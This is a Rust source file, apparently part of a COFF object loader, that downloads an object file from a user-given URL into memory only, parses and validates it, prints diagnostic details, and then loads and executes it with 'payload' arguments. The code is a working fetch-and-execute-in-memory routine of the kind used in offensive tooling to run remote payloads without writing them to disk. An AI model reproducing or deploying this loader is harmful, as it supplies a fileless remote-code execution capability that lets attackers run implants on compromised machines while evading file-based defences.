use crate::coff;
use crate::imports;
use crate::validation;
use crate::loader;

use std::process;
use std::ffi::CString;
use std::time::Duration;
use reqwest::blocking::Client;
use imports::dependencies::analyze_dependencies;

/// Toggle verbose COFF-loader diagnostics.
const DEVELOP_MODE: bool = true;

pub fn run(args: &[String]) {
    let develop_mode = DEVELOP_MODE;

    // args[0] = URL, args[1..] = payload argv.
    let url = args.get(0).map(|s| s.as_str()).unwrap_or_else(|| {
        eprintln!("Usage: <url> [payload-argv...]");
        process::exit(1);
    });

    if url.is_empty() {
        eprintln!("Empty URL argument");
        process::exit(1);
    }

    if !(url.starts_with("http://") || url.starts_with("https://")) {
        eprintln!("Invalid URL (must be http/https): {}", url);
        process::exit(1);
    }

    // Payload argv = everything after the URL.
    let payload_argv = args.get(1..).unwrap_or(&[]).join(" ");
    let payload_args = CString::new(payload_argv).unwrap_or_else(|e| {
        eprintln!("Invalid payload argv (embedded NUL): {}", e);
        process::exit(1);
    });

    if develop_mode {
        println!("Fetching: {}", url);
    }

    // ---- Fetch the COFF object into RAM only ----
    let client = Client::builder()
        .timeout(Duration::from_secs(120))
        .build()
        .unwrap_or_else(|e| {
            eprintln!("Failed to build HTTP client: {}", e);
            process::exit(1);
        });

    let response = client.get(url).send().unwrap_or_else(|e| {
        eprintln!("Failed to send request: {}", e);
        process::exit(1);
    });

    if !response.status().is_success() {
        eprintln!("HTTP error: {}", response.status());
        process::exit(1);
    }

    let bytes: Vec<u8> = response.bytes().unwrap_or_else(|e| {
        eprintln!("Failed to read response body: {}", e);
        process::exit(1);
    }).to_vec();

    if bytes.is_empty() {
        eprintln!("Downloaded payload is empty");
        process::exit(1);
    }

    // Everything downstream works on `bytes` (a &[u8]) — same as `mmap` before.
    let payload: &[u8] = &bytes;

    if develop_mode {
        println!("Input: {}", url);
        println!("Size: {} bytes", payload.len());
    }

    // 1. Parse
    let object = coff::parse(payload).unwrap_or_else(|e| {
        eprintln!("COFF parsing failed: {}", e);
        process::exit(1);
    });

    // 2. Validate
    if let Err(e) = validation::validate(&object, payload.len()) {
        eprintln!("Validation failed: {}", e);
        process::exit(1);
    }

    // 3. Develop-mode diagnostics
    if develop_mode {
        println!("\nCOFF parsing and validation successful.");

        println!("\n========== HEADER ==========");
        println!("{:#?}", object.header);

        println!("\n========== SECTIONS ==========");
        println!("{:#?}", object.sections);

        println!("\n========== SYMBOLS ==========");
        println!("{:#?}", object.symbols);

        println!("\n========== RELOCATIONS ==========");
        println!("{:#?}", object.relocations);

        let report = analyze_dependencies(object.symbols.iter().map(|s| {
            (s.name.as_str(), s.section_number, s.storage_class)
        }));

        println!("\n========== EXTERNAL DEPENDENCIES ==========");
        for d in &report.dependencies {
            println!("Symbol:   {}", d.symbol);
            println!("DLL:      {}", d.dll.as_deref().unwrap_or("Unknown"));
            println!("Function: {}", d.function);
            println!();
        }
        println!("Total external dependencies: {}", report.dependencies.len());

        println!("\n========== LOADING & EXECUTING ==========");
    }

    // 4. Load & execute — `payload_args` is the CString load_and_execute wants.
    if let Err(e) = loader::load_and_execute(&object, payload, develop_mode, &payload_args) {
        eprintln!("Execution failed: {}", e);
        process::exit(1);
    }
}